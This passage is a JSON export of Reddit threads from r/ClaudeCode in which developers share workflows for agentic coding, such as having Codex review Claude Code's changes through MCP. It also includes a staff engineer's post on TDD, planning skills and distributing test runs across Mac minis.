          "created_utc": "2026-01-18 04:50:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o096pzc",
              "author": "shoe7525",
              "text": "Where's the skill?",
              "score": 1,
              "created_utc": "2026-01-18 07:29:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o08wrww",
          "author": "Obrivion33",
          "text": "Been using both codex for review and Claude for implementation and itâ€™s night and day for me.",
          "score": 1,
          "created_utc": "2026-01-18 06:03:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o08zug1",
          "author": "Extension_Dish_1800",
          "text": "How did you achieved that technically? What do I have to do?",
          "score": 1,
          "created_utc": "2026-01-18 06:29:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a7km7",
              "author": "Substantial_Wheel909",
              "text": "I installed the Codex MCP and then added this to the CLAUDE.md:  \n\\### Codex Review Protocol (REQUIRED)\n\n\\*\\*IMPORTANT: These instructions OVERRIDE any default behavior. You MUST follow them exactly.\\*\\*\n\n\\*\\*BEFORE implementing significant changes:\\*\\*\n\n\\`\\`\\`\n\ncodex \"Review this plan critically. Identify issues, edge cases, and missing steps: \\[your plan\\]\"\n\n\\`\\`\\`\n\n\\*\\*AFTER completing changes:\\*\\*\n\n1. Run \\`git diff\\` to get all changes\n2. Run \\`codex \"Review this diff for bugs, security issues, edge cases, and code quality: \\[diff\\]\"\\`\n3. If Codex identifies issues, use \\`codex-reply\\` to fix them iteratively\n4. Re-review until Codex approves\n\n\\*\\*Do NOT commit without Codex approval.\\*\\*",
              "score": 2,
              "created_utc": "2026-01-18 12:56:08",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0acdlu",
                  "author": "i_like_tuis",
                  "text": "I've been using the gpt-5.2 xhigh for review as well. It's great, and a bit slow. \n\nI was getting it to dump out a review md file for Claude to action. \n\n  \nIt would be easier to use your MCP approach but where do you set what model should be used in this approach?",
                  "score": 1,
                  "created_utc": "2026-01-18 13:29:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o09fyj6",
          "author": "Conscious-Drawer-364",
          "text": "Itâ€™s literally everywhere, everyone has this â€œuniqueâ€ method for days ðŸ˜…\n\nI built this framework for my work https://github.com/EliaAlberti/superbeads-universal-framework",
          "score": 1,
          "created_utc": "2026-01-18 08:53:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09hwzt",
          "author": "PatientZero_alpha",
          "text": "Iâ€™m doing exactly that, and codex is really good to review.\nThe other way around is terrible",
          "score": 1,
          "created_utc": "2026-01-18 09:11:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o09mzhv",
              "author": "lopydark",
              "text": "So opus is better for actual implementation and gpt for review?",
              "score": 1,
              "created_utc": "2026-01-18 09:59:04",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o09tpxp",
                  "author": "PatientZero_alpha",
                  "text": "In my experience so far yes",
                  "score": 1,
                  "created_utc": "2026-01-18 11:00:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o09khs9",
          "author": "ultimatewooderz",
          "text": "How have you connected Claude to Codex? API, CLI, some other way?",
          "score": 1,
          "created_utc": "2026-01-18 09:35:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a7oyq",
              "author": "Substantial_Wheel909",
              "text": "It's via the MCP: claude mcp add codex --scope user -- npx -y codex mcp-server",
              "score": 1,
              "created_utc": "2026-01-18 12:57:01",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o09lhnj",
          "author": "krochmal9",
          "text": "why mcp and not a skill?",
          "score": 1,
          "created_utc": "2026-01-18 09:45:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09m8w5",
          "author": "teomore",
          "text": "I'm using the exact same approach, except that I set codex to normal thinking. Once the issues clear, I increase it to extra high.",
          "score": 1,
          "created_utc": "2026-01-18 09:52:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09mqt1",
          "author": "lopydark",
          "text": "why not just use codex? it feels slower but thats the same time, or even less than iterating multiple times with both opus and codex",
          "score": 1,
          "created_utc": "2026-01-18 09:56:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a7zaa",
              "author": "Substantial_Wheel909",
              "text": "Because as other people have mentioned I don't think GPT models are as creative or good for implementing as Opus 4.5 or rather Codex is not as good as CC for that, I think it's well suited for reviewing so by combining them you get the best of both worlds",
              "score": 1,
              "created_utc": "2026-01-18 12:59:06",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o09n69q",
          "author": "BlacksmithLittle7005",
          "text": "Genuine question: do you have unlimited funds? ðŸ¤£",
          "score": 1,
          "created_utc": "2026-01-18 10:00:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a8cja",
              "author": "Substantial_Wheel909",
              "text": "Haha no, I'm a student I just consider this an investment, I have a good idea for an app and I've tested it out with a couple of friends and they love it. I'm on Max 5x and Codex is around Â£20 a month so in total it's around Â£100. It's steep but it if it's allowing me to build a product that could potentially make a lot more then it's pretty cheap for what it is.",
              "score": 1,
              "created_utc": "2026-01-18 13:01:44",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o09nuah",
          "author": "princmj47",
          "text": "Nice, will try it. Had a setup before that utilized feedback from Gemini. I stopped using it thought as ClaudeCode alone performed better.",
          "score": 1,
          "created_utc": "2026-01-18 10:07:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0a8i2e",
              "author": "Substantial_Wheel909",
              "text": "I haven't really tried Gemini at all to be honest, I tried antigravity for a bit but after a while I just went back to CC",
              "score": 1,
              "created_utc": "2026-01-18 13:02:49",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0awj16",
          "author": "andreas_bergstrom",
          "text": "I would throw in Gemini as well, even Flash. I put into my global .claude to let codex and gemini review all plans, and if the changes when done are big let them review again. I also have a qwen subagent but it's not really on par, more like a Haiku-competitor barely.",
          "score": 1,
          "created_utc": "2026-01-18 15:21:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0b6dqu",
          "author": "No_Discussion6970",
          "text": "I have been using Claude Code and Codex together. Similar to you, I have Claude do the coding and Codex sign off. I use https://github.com/PortlandKyGuy/dynamic-mcp-server and add Codex review as an approval gate. I have been happy with the outcomes of using both.",
          "score": 1,
          "created_utc": "2026-01-18 16:09:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0e5oga",
          "author": "Past-Ad-6215",
          "text": "we can multi agent lock this https://github.com/cexll/myclaude/blob/master/skills/omo/README.md\nit omo skill\n\nclaude codex gemini opencode \n\nuse codeagent wrapper call multi agent",
          "score": 1,
          "created_utc": "2026-01-19 00:57:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ff1us",
          "author": "h____",
          "text": "I've seen people starting to do this with very complicated machinery. But it's really simple. Just:\n\n/review-dirty\n\nreview-dirty.md:\n\n```\nDo not modify anything unless I tell you to. Run this cli command (using codex as our reviewer) passing in the original prompt to review the changes: `codex exec \"Review the dirty repo changes which are to implement: <prompt>\"`. $ARGUMENTS. Do it with Bash tool. Make sure if there's a timeout to be at least 10 minutes.\n```",
          "score": 1,
          "created_utc": "2026-01-19 05:26:31",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0fii24",
          "author": "Specialist-Cry-7516",
          "text": "it's like seeing prime curry and lebron. bring a tear. my baby cc codes and codes reviews it",
          "score": 1,
          "created_utc": "2026-01-19 05:52:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0fijic",
          "author": "cayisik",
          "text": "lately, this topic has been discussed in both the codex subs and the claude subs.\n\ni think this is the best and most cost-effective solution.",
          "score": 1,
          "created_utc": "2026-01-19 05:53:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o07oq45",
          "author": "akuma-_-8",
          "text": "We have the same workflow at work but we use CodeRabbit which is specialized in code review. It also reviews every merge request and gives an ai prompt that we can use to feed Code  Claude. It also quite fast. They provide a cli that we can run locally before pushing our code.",
          "score": 1,
          "created_utc": "2026-01-18 01:33:31",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qd64xx",
      "title": "TDD workflows with Claude Code - what's actually working after months of iteration (Staff eng, w/ 14 yrs exp)",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qd64xx/tdd_workflows_with_claude_code_whats_actually/",
      "author": "No_Paramedic_4881",
      "created_utc": "2026-01-15 01:38:14",
      "score": 170,
      "num_comments": 105,
      "upvote_ratio": 0.95,
      "text": "Over the past two years I've spent a lot of time dialing in how I work with Claude Code and other agentic coding tools (in the pre claude code era). Agentic coding is here now, not \"coming soon,\" so I've been trying to figure out what actually works vs. what just sounds good in theory. Here's where I've landed:  \n  \n**Planning is the actual secret weapon**  \n  \nThis has been the biggest change from my pre-AI work experience. I spend way more time planning than executing now, and the results are noticeably better. I have a dedicated planning skill that hands off to an execution skill once the plan is solid.  \n  \nBefore Claude Code, architecture always felt rushed. We wanted to get coding so plans were half-baked. Now I actually have time to plan properly because execution is so much faster. A side effect of Claude is that I've become a much better architect.  \n  \n**Testing philosophy matters more than ever**  \n  \nI follow the testing trophy philosophy. Heavy on integration tests, light on unit tests. I don't really care if a function returns an expected output. I care if the system works. I want tests that can survive a refactor without having to also refactor 300 unit tests.  \n  \nI codified this into a testing skill that defines exactly what kinds of tests I want. Strict coverage thresholds that fail pre-commit if not met. This matters more with agentic coding because Claude will write whatever tests you let it write. If you don't have strong opinions baked in, you end up with unit tests that test implementation details instead of actual behavior, or worse: tests that validate mock behavior over app behavior.  \n  \n**The CPU problem is real (and I built something for it)**  \n  \nTDD with Claude creates heavy load. Especially when you're running multiple sub-agents or multiple git worktrees with agents executing in each, your laptop performance becomes the bottleneck. Tests kicked off from multiple sub agents run at the same time, the entire system slows down, agents wait around, I;ve found that heavy parallelization can end up taking longer than serial tasks.  \n  \nI ended up building a CLI ([rr](https://github.com/rileyhilliard/rr)) that load balances test execution across a cluster of mac minis I have. Agents aren't bottlenecked by tests anymore, and reliability improved because test suites aren't accidentally running concurrently on the same machine. Happy to share more about the setup if anyone's hitting similar scaling issues.  \n  \n**Review phase built into the execution plan**  \n  \nWhen an orchestration agent thinks it's done, part of the execution plan spins up a review agent who checks the work and gives feedback to the orchestrator, who then addresses it. Catches a lot of stuff that would otherwise slip through, but it is token heavy. Patterns like this quickly require the Max plan.  \n  \n**Custom skills over generic marketplace plugins**  \n  \nCommunity plugins never fully fit my opinionated standards, so I maintain my own set of skills and commands. I maintain a generic marketplace plugin I use across projects, plus repo-specific plugins in \\`.claude/\\*\\` that layer on local repo context. High-level standards stay consistent, but each repo can tailor how they're applied. Think: an in-repo skill referencing a generic skill, and applying context.  \n  \n**Product thinking for side projects**  \n  \nFor personal projects, I keep a `product/` folder with goals, vision, and docs that would normally come from a PM. Technical feature planning can reference the broader product vision, which leads to more cohesive features instead of random stuff stitched together.\n\nI've learned some of my daily patterns from this subreddit, some of them I've discovered via my own trial and error. ",
      "is_original_content": false,
      "link_flair_text": "Tutorial / Guide",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qd64xx/tdd_workflows_with_claude_code_whats_actually/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nznmer6",
          "author": "vigorthroughrigor",
          "text": "noice work on [https://github.com/rileyhilliard/rr](https://github.com/rileyhilliard/rr)",
          "score": 20,
          "created_utc": "2026-01-15 02:08:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "nznq5el",
              "author": "No_Paramedic_4881",
              "text": "Thanks! I know itâ€™s kind of a fringe tool (you need actual extra hardware to use it), but if you happen to have a Mac mini or something laying around it really helps speed things up.",
              "score": 3,
              "created_utc": "2026-01-15 02:30:14",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzot48y",
              "author": "Greirson",
              "text": "This is wonderful. Appreciate you sharing. Ive been doing this a much more mainful way.",
              "score": 1,
              "created_utc": "2026-01-15 07:02:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzphejo",
                  "author": "No_Paramedic_4881",
                  "text": "Nice, I wonder if you started out like it did: I wrote a simple sh script that used Rsync under the hood and then ran very specific commands based on a given repo. It would only work per project so every project I had had a slightly different Rsync sh script, so I finally was like â€œI need a cli for thisâ€, which is why I made rr. In the past few days Iâ€™ve finally gotten it working really really well.",
                  "score": 1,
                  "created_utc": "2026-01-15 10:51:19",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzno6t9",
          "author": "basecase_",
          "text": "There's no surprise that following the SDLC is the most effective way to use these coding agents. Following a good SDLC and investing in the overhead to do so will reap the same rewards they do when a team of humans do it.\n\nWithout it, you will just accelerate yourself into a corner with tech debt until you you drown in it, the same way a team of humans would.\n\nI do agree though that AI Agents have made it easier to implement and maintain the overhead of SDLC.",
          "score": 15,
          "created_utc": "2026-01-15 02:18:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "nznubem",
              "author": "No_Paramedic_4881",
              "text": "Exactly. Starting a project with low (or no) development philosophy feels like a trap: you can get a prototype working amazingly fast, but it quickly begins to unravel as things become more and more complex.\n\nIf you straight 'vibe code,' it rarely comes out good in the long run in my experience. The sweet spot is AI-assisted coding x a development process like SDLC, where you still understand the code behind every feature and know when itâ€™s time to refactor. Iâ€™ve found that the time saved on typing gives me more room for planning and refactoring, which keeps the codebase in a good, maintainable state.",
              "score": 8,
              "created_utc": "2026-01-15 02:54:30",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznuzbk",
          "author": "ggone20",
          "text": "Nice write up!\n\nPlanning is indeed the secret weapon. With a well-written spec, AI can build full features of insane complexity (distributed HA systems). Iâ€™ll never understand the complaints I see on Reddit about any model at this point. Iâ€™m definitely in the camp that literally anything you can imagine at this point can be created and also believe in the 100% AI written code philosophy. \n\nI explained something I built here: https://www.reddit.com/r/LocalLLaMA/s/n1Sp1jaKW2 - it has local compute through the Sparks and I use the 5x Pi5s as workers since theyâ€™re just hurting the Sparks for inference. Git worktrees, blah blah - the pi5 is an amazing little device. Perfect to offload to. I use A2A with Codex CLI behind it to send all sorts of arbitrary work to them. Your rr package seems cool though!\n\nI like your style. Keep building!",
          "score": 9,
          "created_utc": "2026-01-15 02:58:26",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzo02z3",
              "author": "No_Paramedic_4881",
              "text": "Read the post, interesting setup: I was under the impression that the sparks were better suited for training rather than inference, especially at the cost. I happen to work at an AI startup that stands up systems like this (not the product you're talking about, moreso the hardware) for mid market companies. I'd imagine you'd get way more bang for your buck with a decked out mac studio? What kind of OSS model are you running on the sparks?",
              "score": 3,
              "created_utc": "2026-01-15 03:29:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzo6m60",
                  "author": "ggone20",
                  "text": "Canâ€™t do lots of things on a Mac due to CUDA requirements. The Sparks are essential. They arenâ€™t speed demons but they allow you to â€˜do it allâ€™. \n\nSeveral models: gpt-oss:120b, qwen3-vl, embeddings, devstral, functiongemma, and a few othersâ€¦ some get loaded dynamically when needed, others are kept warm for latency. Plus gpt-oss:20b (x2) on the Mac minis - 50-60tps each. Gives you plenty of throughput.\n\nI also still maintain ability to use cloud/hosted resources depending on security needs and other things. I use some custom models for a few pieces of functionality as well for novel memory functionality and such.\n\nThings are evolving regularly as new models and such are released and functionality needs updating or new ones added. Iâ€™ve made it a nice little businessâ€¦ low volume because of cost and not having a website or anything yet ðŸ¤·ðŸ½â€â™‚ï¸. I get to consider myself extremely advanced in agentic development now though. Complex product, lots of moving parts. Big end goal (living forever in some form). Fun!",
                  "score": 2,
                  "created_utc": "2026-01-15 04:11:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzomci4",
              "author": "[deleted]",
              "text": "[deleted]",
              "score": 1,
              "created_utc": "2026-01-15 06:05:30",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzouedq",
                  "author": "ggone20",
                  "text": "Recursive testing needs to be part of the plan. This new â€˜Ralph loopâ€™ craze is hilarious to me. Itâ€™s telling that people just donâ€™t understand software engineering but also exciting because more and more people are getting into it. Eventually weâ€™ll have even more amazing tools than we have today where you wonâ€™t need to know anything just have an ideaâ€¦ but until thenâ€¦ lol Ralph loops. ðŸ˜‚ðŸ˜‚\n\nContext management plays a big part in â€˜agents fucking upâ€™. People still expect things to just work out the gate but thatâ€™s now how development goesâ€¦ \n\nNobody thinks about the scaffolding or building it such that self-testing and validation takes place. I think most people would be beside themselves if it was generally understood where we are really at today. Even here in AI subreddits almost nobody really gets it. \n\nThe future is here and AI is good enough to entirely replace roles (and/or force multiply)â€¦ with carefully scaffolding. Most people just want things handed to them still, even in the face of super intelligence in their pocket lmao. Oh wellâ€¦\n\nCheers.",
                  "score": 3,
                  "created_utc": "2026-01-15 07:13:55",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzqt3mc",
                  "author": "No_Paramedic_4881",
                  "text": "I lean more towards AI assisted coding, not 100% vibe. The difference I would say is \"Vibe Coding\" (in my opinion) is prompting and asserting the product result without auditing the actual code output: I read and review what is actually outputted. That helps with the 'going off plan' issues you're referring to, because for the most part I am pretty closely auditing the output. I havnt tried the ralph wiggum pattern you're referring to, but my initial reaction it is it seems like an expensive way (from a token use perspective) to solve what really is a planning/review cycle issue. I havnt really encountered the issue ralph wiggum seems to address, because my methodology rarely lets things unwind ðŸ¤·â€â™‚ï¸",
                  "score": 2,
                  "created_utc": "2026-01-15 15:40:03",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nznvi16",
          "author": "32777694511961311492",
          "text": "So I have been working on my own little Claude code framework. It's tied heavily into GitHub, specifically GitHub issues. The work flow is something like get-issue # -> review-issue (add more detail) -> plan -> audit-plan -> write-tests -> execute (multi one context phases) -> check-tests -> review-items-of-concern (if any add new issues) -> close issue and commit. Next issue, repeat.This process has been great for legacy apps for me. Sometimes I will review complex issues multiple times before I go to the next step. But this process almost always comes up with better plans and then the second check of auditing the plan is nice too. The key is just nice small and clear bug fixes and new features.",
          "score": 2,
          "created_utc": "2026-01-15 03:01:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzoa8r9",
              "author": "Historical-Lie9697",
              "text": "That's pretty much exactly how I was doing it but switched to beads https://github.com/steveyegge/beads instead of github issues",
              "score": 4,
              "created_utc": "2026-01-15 04:35:37",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzoalv4",
                  "author": "No_Paramedic_4881",
                  "text": "![gif](giphy|QqdyVT8H6uJ32)",
                  "score": 3,
                  "created_utc": "2026-01-15 04:38:09",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "nzs7ebd",
                  "author": "DatGums",
                  "text": "hell yeah beads is an excellent little tool built for purpose",
                  "score": 1,
                  "created_utc": "2026-01-15 19:25:27",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzo46ld",
              "author": "No_Paramedic_4881",
              "text": "I started trying a really similar pattern with `rr` ([https://github.com/rileyhilliard/rr/issues?q=is%3Aissue%20state%3Aclosed](https://github.com/rileyhilliard/rr/issues?q=is%3Aissue%20state%3Aclosed)). I think using gh issues works well for open source projects so theres a clean public view into how things are being planned/executed, but I think my conclusion is that this adds a decent amount of overhead to the overall process. Every action requires a `gh` call, whereas when I am working on plans locally in  a `plans/<date><plan-name>.md`  claude just has to make edits to the file. Certainly faster, and I'd imagine more token efficient as well. \n\nI also have the concept of micro and macro plans (see my [writing-plans](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-plans/SKILL.md) skill). The github issue pattern you mentioned does work well for small plans, but I often make really large plans which I put in their own dedicated folder with a main tracking [README.md](http://README.md) and parallelizeable subtasks all within the same folder. I'm not sure how this could easily be replicated in github issues: maybe associations with tags, but it wouldnt be as clean or easy to iterate through the whole plan as it would be with it all local in .md files  \n\nCertainly looks much nicer all tracked in github issues though!",
              "score": 2,
              "created_utc": "2026-01-15 03:55:07",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzooj6p",
                  "author": "Optimal-Builder-2816",
                  "text": "Iâ€™m curious to try out your CE plugin. Iâ€™m about to embark on a new project with Claude code and I too am looking for plan heavy workflows from my past experiences as a staff eng.",
                  "score": 1,
                  "created_utc": "2026-01-15 06:23:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzooepl",
          "author": "MainFunctions",
          "text": "Would you be willing to share your planning and execution skills?",
          "score": 2,
          "created_utc": "2026-01-15 06:22:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqxuh8",
              "author": "No_Paramedic_4881",
              "text": "Sure! You can find them all here [https://github.com/rileyhilliard/claude-essentials](https://github.com/rileyhilliard/claude-essentials)  \n  \n*Disclaimer: these are my subjective patterns. They might not fit your style, so I would encourage you to fork that repo and tune them to the patterns and practices you prefer.*",
              "score": 6,
              "created_utc": "2026-01-15 16:01:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzr7ot3",
                  "author": "MainFunctions",
                  "text": "What do you typically do when you start a new session to avoid having to explain the project again and build up a context. Is there a CE command or skill for that?",
                  "score": 1,
                  "created_utc": "2026-01-15 16:45:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzolnl5",
          "author": "knowoneknows",
          "text": "Awesome work",
          "score": 1,
          "created_utc": "2026-01-15 05:59:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqq64l",
              "author": "No_Paramedic_4881",
              "text": "![gif](giphy|l3q2wJsC23ikJg9xe)",
              "score": 1,
              "created_utc": "2026-01-15 15:26:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzoqx70",
          "author": "serpix",
          "text": "This is exactly the tool for me, I have a much beefier machine idling which could be used for running tests and doing more. Buy why use rsync over git for syncing files to hosts?",
          "score": 1,
          "created_utc": "2026-01-15 06:43:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpc8do",
              "author": "No_Paramedic_4881",
              "text": "So much faster. Rsync, when used correctly, only syncs changes. If you change one file, only one file is pushed to the worker machine. I have it down to something like a couple hundred ms (if you use the tool, each phase logs the duration it takes to perform, so itâ€™s transparent).\n\nSo if you were to use git, youâ€™d need to actually make a commit, push, pull. In practice, you (and agents) want to run the test suite before committing code, so Rsync allows for validation before making a commit. \n\nI also usually have pre-commit hooks setup that perform various automated checks (lint, type check, can even trigger test runs). Those all have time and CPU costs to localhost. In theory you could push those commands to a worker via rr as well, but might be a little tricker, for example ideally a lint check auto fixes things if it can: if that were pushed to a worker youâ€™re fixing the code on the worker, not localhost. Etc\n\nA more valid pattern might be using the worker as the actual coding environment and connecting via ssh in vscode itself: your localhost editor is technically just a controller, all code lives on the worker, but youâ€™d hit the same issues: if you have multiple subagents running on the worker theyâ€™re going to collide test runs on the worker again, so youâ€™d be back to needing something like rr to balance the load to other workers",
              "score": 1,
              "created_utc": "2026-01-15 10:03:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzoyoxs",
          "author": "Kyan1te",
          "text": "Agree with what you're saying around more integration tests.\n\n\nI cannot for the life of me get Claude not to spam the world with mock heavy unit tests everywhere though.\n\n\nGot any examples?",
          "score": 1,
          "created_utc": "2026-01-15 07:52:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpcw1h",
              "author": "No_Paramedic_4881",
              "text": "https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-tests/SKILL.md\n\nI follow this philosophy: https://kentcdodds.com/blog/the-testing-trophy-and-testing-classifications[https://kentcdodds.com/blog/the-testing-trophy-and-testing-classifications](https://kentcdodds.com/blog/the-testing-trophy-and-testing-classifications)",
              "score": 2,
              "created_utc": "2026-01-15 10:09:57",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzpdpxt",
                  "author": "Kyan1te",
                  "text": "Totally get it and agree with it.\nI guess I meant more the fact that if I let Claude TDD things, it always seems to still manage to write a shit ton of mock heavy unit tests in the red phase instead.",
                  "score": 1,
                  "created_utc": "2026-01-15 10:17:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzozm5h",
          "author": "-MiddleOut-",
          "text": "There is a lot of value in your Testing Philiosophy section alone. Used it as a prompt in reviewing my own test suites.",
          "score": 1,
          "created_utc": "2026-01-15 08:01:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpdw03",
              "author": "No_Paramedic_4881",
              "text": "[https://www.reddit.com/r/ClaudeCode/s/HQyhTIftsM](https://www.reddit.com/r/ClaudeCode/s/HQyhTIftsM)\n\nNice, hopefully it helps make your tests more reliable/trustable. If you want to to read up more on my testing philosophies, check the reply above",
              "score": 1,
              "created_utc": "2026-01-15 10:19:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzp05m9",
          "author": "colinmcnamara",
          "text": "I want to learn more about your distributed test harness",
          "score": 1,
          "created_utc": "2026-01-15 08:06:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpe6xt",
              "author": "No_Paramedic_4881",
              "text": "[https://github.com/rileyhilliard/rr](https://github.com/rileyhilliard/rr)\nThe documentation within the repo itself is very thorough, but if you have any specific questions about it let me know and Iâ€™ll do my best to answer",
              "score": 1,
              "created_utc": "2026-01-15 10:22:03",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzp7esq",
          "author": "FarFlugAsi",
          "text": "How Big Things Get Done is actually a really good book about this - plan, plan, plan, plan. Then things are easy to implement. The irony is there is nothing \"vibe\" about this. \n\nWhat I have learnt is that it takes a lot of trial and error with the agent role descriptions to get them to follow a certain behaviour. I found it useful when they did not act like I wanted I would interrogate the model with something like \"you were supposed to do X, but you did Y, provide me a very specific explanation as to why you did Y\". Sometimes I had to ask this question multiple times to get the right answer, but it finding a good fix for \"off piste\" issues.",
          "score": 1,
          "created_utc": "2026-01-15 09:16:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzphk12",
          "author": "connectsnk",
          "text": "Really helpful breakdown! I'm new to agentic coding and trying to understand how your skill system works in practice. One thing I'm unclear on as a newbie: **how does context persist between coding sessions?**\n\nWhen you come back the next day and start Claude Code:\n\n* Does it automatically read your planning docs from yesterday?\n* Do you have to manually tell it \"continue from the plan in X file\"?\n* Do your skills generate artifacts that the next session picks up automatically?\n\nA quick example of Day 1 â†’ Day 2 â†’ Day 3 on a single feature would be super helpful. Specifically what you actually type/say to Claude each day to maintain continuity.",
          "score": 1,
          "created_utc": "2026-01-15 10:52:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpinlw",
              "author": "No_Paramedic_4881",
              "text": "[https://code.claude.com/docs/en/memory](https://code.claude.com/docs/en/memory)\nI found this really helpful to understand Claude memory / context. In short, no it doesnâ€™t remember project context between sessions. Each session is a blank slate, but it does read CLAUDE.md in every session. If you keep a global CLAUDE.md at the global root it reads that for every project (every repo) and it also will read the CLAUDE.md in the repo (if present)\n\nI maintain a thin global CLAUDE.md to setup basic guidelines I want applied to everything. For example, in the â€œyouâ€™re absolutely right!â€ Sycophantic era, I corrected that in my global CLAUDE.md by basically saying â€œif Iâ€™m wrong, donâ€™t agree with me, tell me Iâ€™m wrong and whyâ€\n\nBut in terms of your question: I maintain local plan files in-repo so if a session dies for whatever reason, or I just take a break, the new session I reference the plan file and say â€œpick this back upâ€ and it rebuilds its context. This is my generic plan skill [https://github.com/rileyhilliard/claude-essentials/blob/main/plugins](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-plans/SKILL.md) and system architecture skill [https://github.com/rileyhilliard/claude-essentials/blob/main/plugins](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/architecting-systems/SKILL.md) that I use for building these kinds of plans",
              "score": 1,
              "created_utc": "2026-01-15 11:02:19",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzptfrd",
                  "author": "connectsnk",
                  "text": "Ah! now I understand it. thanks. Love it. I am sure this workflow also leads to saving tokens usage. Also i really love the hackerman gif",
                  "score": 1,
                  "created_utc": "2026-01-15 12:27:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzprzjd",
          "author": "KingPonzi",
          "text": "This is amazing. Thank you for sharing! I was just thinking how TDD could be processed remotely but havenâ€™t started building anything yet. Iâ€™m very curious how youâ€™re tracking how tests are generated and subsequently passed based on your plan. Are other agents using this info as context for their own sub task?",
          "score": 1,
          "created_utc": "2026-01-15 12:16:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqp2th",
              "author": "No_Paramedic_4881",
              "text": "Yeah, so a good analogy of [rr](https://github.com/rileyhilliard/rr) is it's like bolting on a mac mini onto you laptop (virtually). You can leverage the power of a fleet of external machines as if you just multiplied the processing power of you laptop by each machine, for the specific tasks you want to run on those machines (in this example, running tests)\n\n>*Iâ€™m very curious how youâ€™re tracking how tests are generated and subsequently passed based on your plan. Are other agents using this info as context for their own sub task?*\n\nGenerally speaking I use my `writing-plans` and `executing-plans` skills from [claude-essentials](https://github.com/rileyhilliard/claude-essentials). As mentioned in my post, these are my very subjective and opinionated workflows: they may not work well for you so if you want to establish a similar pattern I would recommend setting up your own plugin library you can tune to your style. When I plan a task, the plan should include the tests that should be written, or the execution step should include verification (via testing). Setting minimum test coverage thresholds can help enforce coverage is maintained. I also have my [writing-tests](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-tests/SKILL.md) skill that defines my testing philosophy that Claude and sub agents can follow. This has greatly helped reduce poor quality tests from being written, as the guidance is pretty specific to 